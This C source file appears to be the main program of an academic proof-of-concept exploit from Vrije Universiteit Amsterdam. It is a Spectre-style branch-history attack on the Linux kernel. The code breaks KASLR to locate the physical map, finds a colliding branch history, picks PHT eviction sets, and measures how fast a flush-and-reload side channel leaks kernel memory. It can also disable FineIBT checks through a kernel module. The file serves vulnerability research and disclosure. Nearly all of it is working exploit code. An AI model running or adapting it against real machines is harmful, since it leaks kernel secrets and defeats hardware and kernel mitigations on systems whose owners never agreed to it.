/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <sys/syscall.h>
#include <pthread.h>

#include "contention.h"
#include "targets.h"
#include "flush_and_reload.h"
#include "colliding_bhb.h"
#include "evict_pht.h"

#include "../../poc-common/common.h"
#include "../../poc-common/kaslr_prefetch/kaslr_prefetch.h"


// uuid_string+324
#define TFP_LEAK_TARGET_OFFSET (324 + 0x10)
#define EVICT_SET_ITERATIONS 250

void enable_fine_ibt_check(struct config * cfg, uint64_t patch_target) {
    char buf[17];
    snprintf(buf, 17, "%lx", (size_t) patch_target);


    if (pwrite(cfg->fd_insert_check, buf, strlen(buf), 0) > 0) {
        return;
    }

    // Lets try to first disable it, maybe it was already enabled
    if (pwrite(cfg->fd_remove_check, buf, strlen(buf), 0) > 0
        || pwrite(cfg->fd_insert_check, buf, strlen(buf), 0) > 0) {

        printf("Warning: FineIBT check was already enabled\n");
        return;
    }

    printf("Error by enabling FineIBT check!\n");
    exit(EXIT_FAILURE);

}

void disable_fine_ibt_check(struct config * cfg, uint64_t patch_target) {
    char buf[17];
    snprintf(buf, 17, "%lx", (size_t) patch_target);

    if (pwrite(cfg->fd_remove_check, buf, strlen(buf), 0) > 0) {
        return;
    }

    // Lets try to first enable it, maybe it was already disabled
    if (pwrite(cfg->fd_insert_check, buf, strlen(buf), 0) > 0
        && pwrite(cfg->fd_remove_check, buf, strlen(buf), 0) > 0) {

        printf("Warning: FineIBT check was already disabled\n");
        return;
    }

    printf("Error by disabling FineIBT check!\n");
    exit(EXIT_FAILURE);

}

// ----------------------------------------------------------------------------
// Leak Core functions
//
// ----------------------------------------------------------------------------

#define LEAK_RATE_TEST_SIZE (1 << 10) // 1 kB; NOTE: max HUGE_PAGE_SIZE - 0x2000

void leak_test_leakage_rate(struct config * cfg) {

    // ------------------------------------------------------------------------
    // Initialize a random buffer to leak

    // We set the the F+R buf to the second 4k page in the huge page
    cfg->fr_buf = cfg->ind_map + 0x1000;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x1000;

    // We initialize the secret from the third 4k page onwards
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++) {
        secret[i] = (uint8_t) rand();
    }
    memset(secret, 0, 7); // First 7 bytes are zero to start the leak

    uint8_t * leaked_bytes = calloc(1, LEAK_RATE_TEST_SIZE);

    set_load_chain_leak_secret(cfg);
    cfg->reload_addr = cfg->fr_buf;

    // ------------------------------------------------------------------------
    // Start the leak

    uint64_t prefix;
    int found;

    *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 7;

    prefix = *(uint64_t *) (cur_byte - 7);

    printf("[%50s]", "");
    int step = 0;
    fflush(stdout);

    uint64_t t0 = time(0);


    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        prefix = *(uint64_t *) (cur_byte - 7);

        found = leak_byte_forwards(cfg, prefix);

        while (found == -1 ) {
            found = leak_byte_forwards(cfg, prefix);
        }

        *cur_byte = found;


        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

        if (i % (LEAK_RATE_TEST_SIZE / 50) == 0) {
            step++;
            printf("\r[%.*s", step, "..................................................");
            fflush(stdout);
        }

    }

    uint64_t t1 = time(0);

    printf("\n%d kB took %ld seconds (%5.4f Byte/sec)\n", LEAK_RATE_TEST_SIZE / 1024, t1 - t0, LEAK_RATE_TEST_SIZE / (double) (t1 - t0));

    // ------------------------------------------------------------------------
    // Verify for any faults

    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        if (secret[i] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE) * 100);


}

// ----------------------------------------------------------------------------
// MAIN
//
// ----------------------------------------------------------------------------


int main(int argc, char **argv)
{
    struct config cfg = {0};
    int opt;
    uint64_t time_start;
    uint64_t target_base = 0;
    uint64_t unix_poll_addr = 0;
    pthread_t tid;
    char colliding_history[MAX_HISTORY_SIZE+1] = "";

    int fast_colliding_phase = 0;


    while ((opt = getopt(argc, argv, "u:t:h:p:f")) != -1) {
        switch (opt) {
            case 'h':
                strncpy(colliding_history, optarg, MAX_HISTORY_SIZE);
                colliding_history[MAX_HISTORY_SIZE] = '\x00';
                printf("Colliding history provided!\n");
                break;
            case 't':
                sscanf(optarg, "%lx", &target_base);
                break;
            case 'f':
                fast_colliding_phase = 1;
                break;
            case 'u':
                sscanf(optarg, "%lx", &unix_poll_addr);
                break;
            case 'p':
                sscanf(optarg, "%lx", (uint64_t *) &cfg.phys_start);
                break;
            default:
                printf("Usage:\n"
                    "%s -t TARGET_BASE [options]\n"
                    "  -t TARGET_BASE     target base address (uuid_string)\n"
                    "  -h HISTORY         a previous found colliding history\n"
                    "  -p PHYS_MAP        the start of the physical map\n"
                    "  -f FAST            Disable FineIBT check during collision finding\n"
                    "  -u                 unix_poll address (required with -f)\n"
                    , argv[0]);
                exit(1);
        }
    }

    if (target_base == 0) {
        printf("Usage:\n"
            "%s -t TARGET_BASE [options]\n"
            "  -t TARGET_BASE     target base address (uuid_string)\n"
            "  -h HISTORY         a previous found colliding history\n"
            "  -p PHYS_MAP        the start of the physical map\n"
            "  -f FAST            Disable FineIBT check during collision finding\n"
            "  -u                 unix_poll address (required with -f)\n"
            , argv[0]);
        exit(1);
    }

    int seed = time(0);
    printf("Seed: %d\n", seed);
    srand(seed);


    // ------------------------------------------------------------------------
    // Open all required descriptors

    cfg.epoll = syscall(__NR_epoll_create, /*size=*/2);
    assert(cfg.epoll);
    cfg.fd_sock = syscall(__NR_socket, /*domain=*/1ul, /*type=*/1ul, /*proto=*/0);
    assert(cfg.fd_sock);

    if (fast_colliding_phase) {

        if (unix_poll_addr == 0) {
            printf("Please provide the address of unix_poll (-u)\n");
            exit(EXIT_FAILURE);
        }

        if (access(PATH_PATCH_INSERT_CHECK, F_OK) == 0) {
            cfg.fd_insert_check = open(PATH_PATCH_INSERT_CHECK, O_WRONLY);
            assert(cfg.fd_insert_check);
        } else {
            printf("Error: %s file not found. Please insert the kernel module\n", PATH_PATCH_INSERT_CHECK);
            exit(EXIT_FAILURE);
        }

        if (access(PATH_PATCH_REMOVE_CHECK, F_OK) == 0) {
            cfg.fd_remove_check = open(PATH_PATCH_REMOVE_CHECK, O_WRONLY);
            assert(cfg.fd_remove_check);
        } else {
            printf("Error: %s file not found. Please insert the kernel module\n", PATH_PATCH_REMOVE_CHECK);
            exit(EXIT_FAILURE);
        }
    }


    // ------------------------------------------------------------------------
    // Allocate a huge page
    cfg.ind_map = allocate_huge_page();


    // ------------------------------------------------------------------------
    // Find the physical map start by KASLR break

    printf("------------------------------------------------------\n");
    printf("Find physical map start address\n");
    printf("------------------------------------------------------\n");
    time_start = time(0);

    if (!cfg.phys_start) {
        #if 1
            for (size_t i = 0; i < 5 && cfg.phys_start == 0; i++)
            {
                cfg.phys_start = (uint8_t *) find_phys_map_start();
            }
            if (cfg.phys_start == 0) {
                printf("Failed finding Physical Map start!");
                exit(EXIT_FAILURE);
            }
        #else
            cfg.phys_start = (uint8_t *)  0xffff888000000000;

        #endif
    }

    printf("Direct Physical Map start: %p\n", cfg.phys_start);
    printf("[+] Step took: %ld sec\n", time(0) - time_start);


    // ------------------------------------------------------------------------
    // Setup buffers + the target fd

    cfg.history = calloc(sizeof(uint64_t), MAX_HISTORY_SIZE);

    // ------------------------------------------------------------------------
    // Find the kernel address of our huge page


    cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));

    while ((uint64_t) cfg.ind_map_kern % HUGE_PAGE_SIZE != 0)
    {
        printf("Invalid huge_page! User: %p Kernel: %p\n", cfg.ind_map, cfg.ind_map_kern);
        sleep(1);
        cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));
    }
    printf(" - User huge page addr: %p Kernel huge page addr: %p\n", cfg.ind_map, cfg.ind_map_kern);

    cfg.fr_buf = cfg.ind_map + 0x1000;
    cfg.fr_buf_kern = cfg.ind_map_kern + 0x1000;
    printf(" - User FR_BUF: %p Kernel FR_BUF: %p\n", cfg.fr_buf, cfg.fr_buf_kern);

    memset(cfg.fr_buf, 0x90, 64);

    cfg.tfp_leak_target = (uint8_t *) (target_base + TFP_LEAK_TARGET_OFFSET);
    printf(" - TFP_LEAK_TARGET: %p\n", cfg.tfp_leak_target);


    for (size_t i = 0; i < NUMBER_OF_EVICT_SETS; i++)
    {
        cfg.all_pht_cfg[i] =  init_pht_eviction(0);
    }
    printf(" - Allocated %d PHT eviction sets\n", NUMBER_OF_EVICT_SETS);

    pin_to_core(CORE_TESTING);
    pthread_create(&tid, NULL, start_contention, NULL);
    usleep(300);


    // ------------------------------------------------------------------------
    // Find a colliding history

    printf("------------------------------------------------------\n");
    printf("Find a colliding history for the victim -> target\n");
    printf("------------------------------------------------------\n");
    time_start = time(0);


    if(strlen(colliding_history) == MAX_HISTORY_SIZE) {
        for(int i = 0; i < MAX_HISTORY_SIZE; i++) {
            cfg.history[i] = colliding_history[i] - '0';
        }
    } else {

        if (fast_colliding_phase) {
            printf("======== %15s ======== \n", "Disabling FineIBT Check...");
            disable_fine_ibt_check(&cfg, unix_poll_addr);

            find_colliding_history(&cfg, 0);

            printf("======== %15s ======== \n", "Enabling FineIBT Check...");
            enable_fine_ibt_check(&cfg, unix_poll_addr);


        } else {
            find_colliding_history(&cfg, 1);
        }

    }

    printf("[+] Step took: %ld sec\n", time(0) - time_start);

    // ------------------------------------------------------------------------
    // Double check signal

    printf("----------------------------------------------- \n");

    if (fast_colliding_phase) {
        printf("Leakage rate without eviction:\n");

        for (size_t i = 0; i < 2; i++) {
            print_leakage_rate(&cfg, 5000);
        }
        cfg.pht_cfg = cfg.all_pht_cfg[0];
        printf("Leakage rate with eviction:\n");
    }


    for (size_t i = 0; i < 2; i++) {
        print_leakage_rate(&cfg, 5000);
    }


    printf("------------------------------------------------------\n");
    printf("Find a PHT eviction set with a high hit rate\n");
    printf("------------------------------------------------------\n");
    time_start = time(0);


    set_load_chain_simple_touch(&cfg, 3);

    uint64_t hit_rates[NUMBER_OF_EVICT_SETS] = {0};
    uint64_t max_hits = 0, hits = 0;
    int best_set = 0;

    while (1)
    {

        for (int i = 0; i < (NUMBER_OF_EVICT_SETS * 2); i++)
        {
            int evict_set = i % NUMBER_OF_EVICT_SETS;
            cfg.pht_cfg = cfg.all_pht_cfg[evict_set];

            hits = do_flush_and_reload(&cfg, EVICT_SET_ITERATIONS, 0);

            hit_rates[evict_set] += hits;


            printf("%3.0f%%|", ((float) hits / EVICT_SET_ITERATIONS) * 100);

            if(i == (NUMBER_OF_EVICT_SETS - 1)) {
                 printf("\n");
            }

            fflush(stdout);
        }

        // select best eviction set

        for (size_t i = 1; i < NUMBER_OF_EVICT_SETS; i++)
        {
            if (hit_rates[i] > hit_rates[best_set]) {
                best_set = i;
            }
        }

        if (max_hits < hit_rates[best_set]) {
            max_hits = hit_rates[best_set];
        }

        printf("\n > ALL TIME BEST: %4ld (%6.2f%%)\n", max_hits, ((float) max_hits / (EVICT_SET_ITERATIONS * 2)) * 100);

        if (hit_rates[best_set] < (EVICT_SET_ITERATIONS * 2 * 0.65)) {
            // randomize again

            for (int i = 0; i < NUMBER_OF_EVICT_SETS; i++)
            {
                randomize_branch_locations(cfg.all_pht_cfg[i], 0);
            }

            memset(hit_rates, 0, sizeof(hit_rates));

        } else {

            printf(">> Selected eviction set %d with %4ld (%6.2f%%) hits\n",
                best_set, hit_rates[best_set], ((float) hit_rates[best_set] / (EVICT_SET_ITERATIONS * 2)) * 100);

            cfg.pht_cfg = cfg.all_pht_cfg[best_set];
            break;
        }
    }

    printf("[+] Step took: %ld sec\n", time(0) - time_start);
    printf("----------------------------------------------- \n");


    for (size_t i = 0; i < 2; i++)
    {
        print_leakage_rate(&cfg, 5000);
    }

    printf("------------------------------------------------------\n");
    printf("Testing the leakage rate with %d kB random values\n", LEAK_RATE_TEST_SIZE / 1024);
    printf("------------------------------------------------------\n");



    leak_test_leakage_rate(&cfg);

}
